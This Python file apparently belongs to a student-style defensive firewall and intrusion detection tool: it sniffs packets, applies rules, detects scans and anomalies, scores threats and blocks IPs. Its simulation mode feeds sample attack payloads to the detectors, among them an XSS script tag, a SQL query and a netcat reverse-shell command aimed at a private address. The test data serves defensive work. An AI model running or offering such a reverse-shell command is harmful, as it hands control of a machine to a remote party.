import logging
import time
import random
from datetime import datetime

from scapy.all import sniff, IP, TCP, UDP

from core.rule_engine import match_rule
from core.ids import detect_port_scan, detect_bruteforce, block_ip, is_blocked
from core.behavior_monitor import monitor_traffic
from core.dpi import inspect_payload


# ==============================
# LOGGING CONFIGURATION
# ==============================

logging.basicConfig(
    filename="logs/events.log",
    level=logging.INFO,
    format="%(asctime)s | %(levelname)s | %(message)s",
)

# ==============================
# THREAT SCORING ENGINE
# ==============================

THREAT_SCORES = {}
BLOCK_THRESHOLD = 5


def increase_threat_score(ip, amount):
    THREAT_SCORES[ip] = THREAT_SCORES.get(ip, 0) + amount

    if THREAT_SCORES[ip] >= BLOCK_THRESHOLD:
        block_ip(ip)
        logging.critical(f"IP {ip} AUTO-BLOCKED (Threat Score: {THREAT_SCORES[ip]})")


# ==============================
# CORE PACKET PROCESSING
# ==============================

def process_packet_data(src_ip, dst_ip, protocol, port, payload=""):

    # If already blocked
    if is_blocked(src_ip):
        logging.warning(f"BLOCKED TRAFFIC from {src_ip}")
        return

    # 1️⃣ Firewall Rule Check
    action = match_rule(src_ip, dst_ip, protocol, port)

    if action == "DROP":
        logging.warning(f"FIREWALL DROP | {src_ip} → {dst_ip} | Port {port}")
        increase_threat_score(src_ip, 3)
        return

    # 2️⃣ IDS - Port Scan Detection
    scan = detect_port_scan(src_ip, port)
    if scan:
        logging.warning(f"IDS DETECTED {scan} from {src_ip}")
        increase_threat_score(src_ip, 2)

    # 3️⃣ Behavioral Monitoring
    anomaly = monitor_traffic(src_ip)
    if anomaly:
        logging.warning(f"ANOMALOUS TRAFFIC from {src_ip}")
        increase_threat_score(src_ip, 1)

    # 4️⃣ Deep Packet Inspection
    attack = inspect_payload(payload)
    if attack:
        logging.warning(f"DPI DETECTED {attack} from {src_ip}")
        increase_threat_score(src_ip, 4)

    # 5️⃣ Normal Allowed Traffic
    logging.info(f"ALLOWED | {src_ip} → {dst_ip} | Port {port}")


# ==============================
# REAL PACKET MODE (Linux)
# ==============================

def process_real_packet(packet):

    if packet.haslayer(IP):
        src_ip = packet[IP].src
        dst_ip = packet[IP].dst

        protocol = None
        port = None
        payload = ""

        if packet.haslayer(TCP):
            protocol = "TCP"
            port = packet[TCP].dport
        elif packet.haslayer(UDP):
            protocol = "UDP"
            port = packet[UDP].dport

        if hasattr(packet, "load"):
            payload = str(packet.load)

        if protocol and port:
            process_packet_data(src_ip, dst_ip, protocol, port, payload)


# ==============================
# SIMULATION MODE (Windows Safe)
# ==============================

def run_simulation():

    print("⚡ Running in Simulation Mode")

    test_ips = [
        "192.168.10.5",
        "192.168.10.6",
        "192.168.10.7",
    ]

    dst_ip = "192.168.20.10"

    test_payloads = [
        "normal traffic",
        "SELECT * FROM users",
        "<script>alert('xss')</script>",
        "nc -e /bin/sh 192.168.1.5 4444",
        "hello world",
    ]

    while True:
        src_ip = random.choice(test_ips)
        port = random.choice([22, 80, 443])
        payload = random.choice(test_payloads)

        process_packet_data(src_ip, dst_ip, "TCP", port, payload)

        time.sleep(2)


# ==============================
# FIREWALL STARTER
# ==============================

def start_firewall(mode="sim"):

    print("🔥 NetSecure Intelligent Firewall Started")

    if mode == "real":
        print("🟢 Running in Real Packet Mode")
        sniff(prn=process_real_packet, store=0)
    else:
        run_simulation()